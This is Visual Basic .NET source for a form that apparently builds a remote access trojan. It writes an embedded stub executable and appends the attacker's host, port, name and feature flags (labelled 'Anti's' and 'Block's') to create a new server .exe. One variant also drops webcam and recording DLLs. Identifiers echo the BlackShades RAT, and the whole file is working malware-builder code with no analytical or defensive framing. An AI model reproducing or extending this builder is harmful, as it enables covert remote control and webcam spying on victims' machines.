Imports System.IO

Public Class bigbuilder
    Dim stub, text1, text2, text3 As String
    Const spl As String = "abccba"
    Dim ex As Exception
    Dim s As New SaveFileDialog
    Private Sub SaveControl()
        My.Settings.Reload()

        My.Settings.Host = TextBox1.Text
        My.Settings.Port = TextBox2.Text
        My.Settings.Name = TextBox3.Text
        My.Settings.Save()
    End Sub
    Private Sub ReloadControl()
        TextBox1.Text = My.Settings.Host
        TextBox2.Text = My.Settings.Port
        TextBox3.Text = My.Settings.Name

    End Sub


    Sub start_withoutcam()
        If TextBox1.Text & TextBox2.Text & TextBox3.Text = "" Then
            MsgBox("Complete Information Please At least Host & Port & Name ", MsgBoxStyle.Critical, "Create Server")
        Else

            s.ShowDialog()
            If s.FileName > "" Then
                text1 = TextBox1.Text
                text2 = TextBox2.Text
                text3 = TextBox3.Text
                Dim temp As String = IO.Path.GetTempPath() & "Stub.exe"
                'FileOpen(1, Application.StartupPath & "\stub.exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                File.WriteAllBytes(temp, My.Resources.serverwithoutcam)

                FileOpen(1, temp, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
                stub = Space(LOF(1))
                FileGet(1, stub)
                FileClose(1)
                FileOpen(1, s.FileName & ".exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                FilePut(1, stub & spl & text1 & spl & text2 & spl & text3 & spl & CheckBox1.Checked & spl & CheckBox2.Checked & spl & CheckBox3.Checked & spl & c5.Checked & spl & c6.Checked & spl & c7.Checked & spl & c8.Checked & spl & c9.Checked & spl & c10.Checked & spl & c11.Checked & spl & c12.Checked & spl & c13.Checked & spl & c14.Checked & spl & c15.Checked & spl & c16.Checked & spl & c20.Checked & spl & CyberCheckBox1.Checked)
                FileClose(1)
                ListBox1.Items.Clear()
                ListBox1.Items.Add("Host : " & text1)
                ListBox1.Items.Add("Port : " & text2)
                ListBox1.Items.Add("Name : " & text3)

                ListBox1.Items.Add("Anti's : " & c6.Checked)
                ListBox1.Items.Add("Block's : " & CyberCheckBox1.Checked)
                ListBox1.Items.Add("Server Build In : " & s.FileName)
            Else
                ListBox1.Items.Add(ex)
            End If
        End If
    End Sub

    Sub start_withcam()
        If TextBox1.Text & TextBox2.Text & TextBox3.Text = "" Then
            MsgBox("Complete Information Please At least Host & Port & Name ", MsgBoxStyle.Critical, "Create Server")
        Else

            s.ShowDialog()
            If s.FileName > "" Then
                text1 = TextBox1.Text
                text2 = TextBox2.Text
                text3 = TextBox3.Text
                Dim temp As String = IO.Path.GetTempPath() & "Stub.exe"
                'FileOpen(1, Application.StartupPath & "\stub.exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                File.WriteAllBytes(temp, My.Resources.ServerCam)
                Dim path As String = IO.Path.GetDirectoryName(s.FileName) & "\"
                Dim savename As String = s.FileName.Replace(path, "")
                File.WriteAllBytes((s.FileName.Replace(savename, "")) & "cam.dll", My.Resources.cam)
                File.WriteAllBytes((s.FileName.Replace(savename, "")) & "rec.dll", My.Resources.rec)
                FileOpen(1, temp, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
                stub = Space(LOF(1))
                FileGet(1, stub)
                FileClose(1)
                FileOpen(1, s.FileName & ".exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                FilePut(1, stub & spl & text1 & spl & text2 & spl & text3 & spl & CheckBox1.Checked & spl & CheckBox2.Checked & spl & CheckBox3.Checked & spl & c5.Checked & spl & c6.Checked & spl & c7.Checked & spl & c8.Checked & spl & c9.Checked & spl & c10.Checked & spl & c11.Checked & spl & c12.Checked & spl & c13.Checked & spl & c14.Checked & spl & c15.Checked & spl & c16.Checked & spl & c20.Checked & spl & CyberCheckBox1.Checked)
                FileClose(1)
                ListBox1.Items.Clear()
                ListBox1.Items.Add("Host : " & text1)
                ListBox1.Items.Add("Port : " & text2)
                ListBox1.Items.Add("Name : " & text3)

                ListBox1.Items.Add("Anti's : " & c6.Checked)
                ListBox1.Items.Add("Block's : " & CyberCheckBox1.Checked)
                ListBox1.Items.Add("Server Build In : " & s.FileName)
            Else
                ListBox1.Items.Add(ex)
            End If
        End If
    End Sub
    Private Sub BlackShadesNetButton1_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton1.Click
        If RadioButton1.Checked = True Or RadioButton2.Checked = True Then
            If RadioButton1.Checked = True Then
                start_withoutcam()
            ElseIf RadioButton2.Checked = True Then

                start_withcam()
            End If
        Else
            MsgBox("Please choose Server to build")
        End If
    End Sub

    Private Sub bigbuilder_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        ReloadControl()
    End Sub

    Private Sub bigbuilder_FormClosing(sender As System.Object, e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing
        SaveControl()
    End Sub

    Private Sub bigbuilder_FormClosed(sender As System.Object, e As System.Windows.Forms.FormClosedEventArgs) Handles MyBase.FormClosed
        SaveControl()
    End Sub
End Class